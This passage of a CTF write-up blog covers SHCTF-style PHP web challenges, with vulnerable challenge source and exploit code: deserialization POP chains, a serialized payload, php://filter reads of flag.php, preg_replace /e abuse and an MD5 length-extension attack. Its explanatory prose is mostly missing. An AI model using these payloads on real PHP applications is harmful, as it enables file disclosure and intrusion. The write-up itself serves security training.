single-quoted-string">'Male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A<code>__invoke()</code>D</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__invoke()</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>B<code>__wakeup()</code></p><blockquote><p> unserialize()  __wakup() </p></blockquote><p>C<code>__toString()</code></p><blockquote><p></p></blockquote><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;N;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e6a723da29b5436689b78b35619a18c3.png" alt="2"></p><h3 id="WEEK1-flag"><a href="#WEEK1-flag" class="headerlink" title="[WEEK1]flag"></a>[WEEK1]flag</h3><p><img src="https://img-blog.csdnimg.cn/ffb2aac663074c77ab96fcb980ccc273.png" alt="12"><br>admin&#x2F;password<br><img src="https://img-blog.csdnimg.cn/cb6374f9e73f41dcad4f2f3a301bba83.png" alt="2"></p><h3 id="WEEK1-"><a href="#WEEK1-" class="headerlink" title="[WEEK1]"></a>[WEEK1]</h3><p>flag<br><img src="https://img-blog.csdnimg.cn/eb16f34b08574889a6c83f04750bb711.png" alt="1"><br>unicode-&gt;base64-&gt;flag</p><h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$pattern</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print_r("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are smart"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"it is begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>\\1</code><code> \1</code>,  <code>\1</code> </p><blockquote><p><strong></strong><code>1</code><code>99</code><code>\n</code>  n </p></blockquote><p><a href="https://xz.aliyun.com/t/2557">preg_replace</a></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>.</code></td><td></td></tr><tr><td><code>\s</code></td><td></td></tr><tr><td><code>\S</code></td><td></td></tr><tr><td><code>+</code></td><td></td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/363feed2972e432a8558d32102c4a1bf.png" alt="1"></p><h3 id="WEEK1-"><a href="#WEEK1-" class="headerlink" title="[WEEK1]~"></a>[WEEK1]~</h3><p><img src="https://img-blog.csdnimg.cn/72cb3c9f90a8402b9a32ef9287dd9387.png" alt="1"><br>flag</p><h3 id="WEEK2-MD5"><a href="#WEEK2-MD5" class="headerlink" title="[WEEK2]MD5"></a>[WEEK2]MD5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag is"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>if</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>extract(parse_url($_POST[&#39;SHCTF&#39;]));</code>SHCTF<code>extract</code><br><a href="https://www.cnblogs.com/xhds/p/12587249.html#_label5">PHP</a><br><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'http://sd.com:12/as.php?s=456'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Array(    [scheme] => http    [host] => sd.com    [port] => 12    [path] => /as.php    [query] => s=456)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http</code><code>host</code><code>sd.com</code><code>query</code><code>s=456</code><code>SHCTF</code><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'host://query/sd.php?SHCTF'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Array(    [scheme] => host    [host] => query    [path] => /sd.php    [query] => SHCTF)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagmd5<br><img src="https://img-blog.csdnimg.cn/c14c045f09a9418bb0382e89e8f99724.png" alt="1"><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>length<code>length=132.456</code>flag42</p><blockquote><p><br>flag.md5&#x3D;2f679a35b591a420d8cc6b60f90d3fb1<br>flag.length&#x3D;42</p><p><code></code><br><a href="https://github.com/shellfeel/hash-ext-attack"></a><br><img src="https://img-blog.csdnimg.cn/2d34bb2cb1de4c5085c00c2ebca01da1.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/d4c7e7d9e3674f8694e493d9d887fc01.png" alt="3"></p></blockquote><h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h3><p><br><a href="https://blog.csdn.net/crisprx/article/details/104457047">PHP</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fei</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">'Mikey Mouse~'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">dong</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token string double-quoted-string">"misca~musca~milaoshu~~~"</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^O:\d+/'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you should think harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"wanna_fl.ag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br></p><blockquote><p>musca-&gt;misca-&gt;milaoshu<br>phpflag.php</p></blockquote><p><img src="https://img-blog.csdnimg.cn/d498fd23f9f1421ab5eda7a7459ab1a1.png" alt="123"><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">musca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">misca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">fei</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">milaoshu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//array</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WEEK3-sseerriiaalliizzee"><a href="#WEEK3-sseerriiaalliizzee" class="headerlink" title="[WEEK3]sseerriiaalliizzee"></a>[WEEK3]sseerriiaalliizzee</h3><p>file_put_contents<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token 